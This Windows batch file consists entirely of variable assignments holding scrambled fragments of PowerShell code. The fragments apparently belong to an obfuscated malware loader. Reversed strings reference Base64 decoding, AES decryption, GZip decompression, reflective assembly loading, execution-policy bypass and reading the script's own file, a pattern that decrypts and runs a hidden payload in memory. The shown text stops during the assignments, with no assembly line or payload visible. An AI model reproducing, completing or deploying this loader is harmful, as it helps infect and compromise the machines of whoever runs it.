@echo off
set "zrsgTKCrBj== [S"
set "NihULqALbP=n ''"
set "fMlbQyPjtC=join"
set "YmCezesNOO=1] -"
set "YoqNPDwfrc= [Sy"
set "wobVXaqqpO=esaB"
set "KmafkaYYpV= '')"
set "oOnMzXkVnt=gnir"
set "XjAZZpJGOO=ecry"
set "BBKWWoihrD=.Mod"
set "kgJSmzaluT=gn.T"
set "GqCqGuwjcM=m.Re"
set "KPVqMvRQkC=rity"
set "CxUQTOdonk=y.Pa"
set "KAEsrdYHWc=ay()"
set "ntoOTksYPN=embl"
set "iFIQSIclzQ=[IO."
set "OVkoMzABCb=.Len"
set "UNQLdjVZvM=soo."
set "PZYanATJfD=am;$"
set "IbSfhOXooi=] -j"
set "ncNdwdQWIa=Syst"
set "AcegXCHPwE=ach "
set "ZdlVXWxqRg=nage"
set "IzlgOfxUCF=join"
set "nelszDiSea=e = "
set "TTVHcABGsU=daeR"
set "rKESrxuVve=eMVs"
set "kIkdcYuJUn=P.Su"
set "wotJfhqhfL=$HHA"
set "uHUInuWdjd=; };"
set "EugWulGhSi= [st"
set "qFNRkEVWUI=d;$H"
set "xFrqKtCEFR=($cH"
set "ZuQmowXXGt=ck($"
set "WmdYBGYYgt=rhdk"
set "OyFTPtsjvU=bQVT"
set "IsSeCDCeUi=ddin"
set "kVoqVAbzVa=HAjN"
set "hYsEPrdTqS=ispo"
set "kBfGXnCQjx= = N"
set "yaHirJhNYN=gsYZ"
set "SGqOyddSPr=cHLm"
set "kgkqxfYPEj=RbQV"
set "pqbqCuExOn=flec"
set "FRkUqgXHNv=L4Yi"
set "mEqlvZUZay=urit"
set "OayxfsebBx=T = "
set "indwGwQuas=$RbQ"
set "GAyGpMSoNM=7;$H"
set "NSUXrgBluW=..-1"
set "eTzNbgOSkW=oS.D"
set "SUYjqDDkfs=)) {"
set "VsiYQJpCFs=Comp"
set "wjgmFnxnjr=ress"
set "tkQemsFwjk=ment"
set "rexpyDBtXn= if "
set "onbexYjmuu=soo "
set "swaiDcKmZt=[Sys"
set "IrXhEFSJNW=ptog"
set "LDlNiybsJI=m.IO"
set "ZIVuSqQxdj=3); "
set "ecfHhQYjPa=pose"
set "rDRXLXEEDv=$fMa"
set "QgsLxAUtNN=MaoS"
set "QmXOOkZgQe=.Dis"
set "hlGXJcoFxI='')("
set "fuwTajPczz=.Ass"
set "NBlsTNtvqn=ion."
set "XBqmkjqHDw=Star"
set "YEczfLNDGx=vert"
set "ggFIZVhpIR=Stre"
set "sHZKtaZVNU=zHhH"
set "UezJXoePIQ='[-1"
set "sPcbgUAfDL=.Cry"
set "gTdXsxZuZC=in $"
set "PHCWkAabcv=F'[-"
set "YouQpjgEbJ='txe"
set "PoflPobHTQ=V = "
set "ZYlutgZROf=ypto"
set "GufDkqVUjh=New-"
set "wgcFdfABsT=rity"
set "nKiueyaFlW=rtS4"
set "UPFGdgEhaW=gMod"
set "cdfqIwsQBM=stem"
set "CeMpoWraHC=('Tg"
set "AUGIPtbYAY=bjec"
set "EcLJJtlhWX=iron"
set "MnFQZNgLag=onve"
set "vcXAjePxuy=-1.."
set "wwMvJwsSlJ=nirt"
set "xnyYDOxLbM=S46e"
set "KdqxfsYfeJ=PTtG"
set "vhSiOWIKrE=.Com"
set "ahnQwDBckE=ptog"
set "PweFFQWMrl=form"
set "sUAopdALMc=qFHV"
set "FgrcWQstAa=tsWi"
set "GOShIwviTD=$zQw"
set "twPIwoZKRe=gn);"
set "wdAKNBSidP=]::N"
set "PjnVTWcnJt=-Obj"
set "aNOhsZTWYF=kf, "
set "wAUpJmWmFS=T, 0"
set "HpyoxoSVPe=]::C"
set "ScDmkgSBBI=oo.T"
set "YXpXdaNrPz=..-1"
set "lkoAXBdnxC=DlTk"
set "fuxSPsnPkg=[Env"
set "qjoFOWISHU=.Mem"
set "EzbmhMUGKe=);$H"
set "CXNdBFhBOd=ring"
set "bzxOKbSijO=);$a"
set "ItcSmwFczz=HHAj"
set "zDzSZNKPyj=lBlo"
set "AIvkLUwBlV=grap"
set "CkoZtaxMRj=.Cop"
set "ztxNqZgAlg=YxVw"
set "AfnBpUaMGg=-ep "
set "rdEWRXwXqv=N.Pa"
set "LcqWnaschi=New-"
set "imFLomMnhE=RmAx"
set "lIDEyDvYMG=::De"
set "yeKhmqJNzR=[]] "
set "vzIWQmHFrB= '')"
set "EprhLqwsaJ=VT ="
set "vZaNEhYhme=jN.I"
set "VyKHblEKXP=;$am"
set "BpeNqPeTTO=ose("
set "JXJkwEYyfv=Syst"
set "AJmCtjrChq=k; }"
set "raBYsOgTeW=ateD"
set "nQAnwvbhSV=;$zZ"
set "fYVzwVRtPK=ptor"
set "MQGaJABbWh=fore"
set "ElkRNoQDwY=ress"
set "EVTwAfMAgN=ect "
set "LWtfPrmzrM=ss -"
set "XrqpWgbkFP=Qwgn"
set "cSyctQCtFm=bstr"
set "WPMNmBoaXG=tS46"
set "QcnDSUwRbi=mxkU"
set "zYSidwRwgo=th('"
set "IPjeBNjkpk=6esa"
set "lqNExZhouI=brea"
set "CqiteScuvp=ose("
set "pZvWNchRFM=Disp"
set "ezFqKnLpuF=qFHV"
set "JVnbijxZNr=LmP."
set "mQOwCTiCbO=Mode"
set "wbHVzNzGvw= [Sy"
set "OCyiDptUFd=tryP"
set "YaBfhFaIRA= = $"
set "LIWQodcBzx=null"
set "YXwejbzydN=c) {"
set "NSBNhcvbUa=yTo("
set "ZmYoJvyZWS=BC;$"
set "yIhrxsJdTf=rofi"
set "XZHqRxGmml=.Cre"
set "RcvNPEJdvo=.Dis"
set "xjboVTMipj=rans"
set "dRlwZeNZlB=f = "
set "JGJPmLlxUy=lit("
set "LmTAhammTb=-joi"
set "EZQrvYUbzq=;$zZ"
set "NqxlCZDKQL=Comp"
set "kCpRHpZmuh=tem."
set "ajsJonxOEl=oryS"
set "uhEcEjBBGV=($cH"
set "SoVYiAWbHq=;$Dl"
set "gCFGqTRsSu=:: '"
set "HTGyjZmrlW=6] -"
set "GiepFgjBte=m.IO"
set "VabMBeQLhm=)($D"
set "qkIwiLcqZF=-joi"
set "VqbTinGOil=).Sp"
set "pOtGFJKlcT=ct S"
set "YzCGcjlDrg=LmP "
set "krDUUmYnEz=::('"
set "PeUPXQfHAB=, (,"
set "AmPaWhthsx=PKCS"
set "jVJoEosVRp=esMa"
set "CJpkKvEbPU=orF'"
set "QdzNRYIiiO=  $D"
set "xUIrURqQor=)))"
set "kXDzTOcIVX=TllA"
set "qfmZPceCVE=comp"
set "VYEvqJTkqU=HAjN"
set "AhzUXtkmhu=Tkf."
set "GnVdUPDCcV=.IO."
set "plkQMmSVAE=$zQw"
set "huROVkZSwX=();$"
set "xyGFqkXDzl=-nop"
set "EVFzCqUwRE=.Sec"
set "uiFjgomGca=g = "
set "ublasVloSp=);$z"
set "YGRoNtWgbK='gni"
set "fJooUaTLly=ert]"
set "VeRfpDMhLY=$ZqG"
set "uJNEOIpNCf=em.I"
set "xKyGQLlgYd=HAjN"
set "rKNGXRoerz=raph"
set "ZpmwWIBvjS=('%~f0'"
set "vHHyKsuGbD=comm"
set "IuWipnUkGk=VT);"
set "uqrJzBKvDc=gjYA"
set "mnfXzaSzMg=ddin"
set "mGcXRDYpbl=oint"
set "NWMCxrNvvD=n ''"
set "hpevpENIGG=dkg "
set "RrwzqtxXPd=rt]:"
set "xToFdlferO=ionM"
set "WFskLfqMXW=.Con"
set "cvwUZkNrZf=saBm"
set "hJhvFtSEHD=g.En"
set "cFqrvvfmOX=t Sy"
set "NwPCqOIKdw= = ["
set "vDDwIpSQgr=ke($"
set "JQvpMWHcxL=[Sys"
set "hTGssEDUEs=HAjN"
set "nesdhAGjEb=Invo"
set "XrKuEOVRVW=tem."
set "kLQQPXwAvL=16] "
set "ntybszFGLz=y.Ci"
set "jvWhLxJpoD=oin "
set "ULnKssJJeS=Disp"
set "UzKHiAxSGT== $H"
set "wfizxluArx=bQVT"
set "gwNRuZRrjw=)($R"
set "DWiYFWuQOL=.Cry"
set "EfpteixvQC=Secu"
set "ypQMFzJIoe=dj0C"
set "ZeqwbHnMkW=$RbQ"
set "QXyRCuEQHt='[-1"
set "qQRSaSzmsx=pose"
set "WkTLlbDWfz=);$H"
set "IBAoQTlxwP=:('g"
set "nIGVRqPCjg=stem"
set "rghmIHaFJW=.Key"
set "zdBWfVDtGx=ne);"
set "UpnIYsMOML=Bmor"
set "nOXbahzppq=ZqGx"
set "MRhEadFsVb=fMao"
set "FTACaNhYNC=y.Cr"
set "rTlkbijhUQ=Conv"
set "PNJIkLDGyh=sion"
set "pcHigSTvgY=l5E7"
set "RgmgnDOqVa=le  "
set "FhtDQGNjEX=ode]"
set "rucpALucyP=hy.A"
set "SDIvcCZSxC=gn ="
set "RRPFyhexli=RbQV"
set "hOrxjKuUfj=m(, "
set "oaaZppbxpR==');"
set "AtorhSytmM=yste"
set "XEKHfDxJgY=-4] "
set "hPCQuiTXID=PxEW"
set "WMducMDgwe=$zZs"
set "fgnhlPBYYn=, $R"
set "kkpFMqBawd=('%*'"
set "uMFqlZMGZR='0Pg"
set "phqsjCmwXH=e]::"
set "fTlsgAsmXI=em.C"
set "wzvJMbaSvz=.-16"
set "ULgDiHOmfm= = $"
set "LHrJkAnVsn===')"
set "pganPAjcct=pres"
set "ECYoZUPpyO=oL'["
set "VfyOZhAyoe=T = "
set "kDXmdikJIX=CFxo"
set "PdodZEGwHQ=trea"
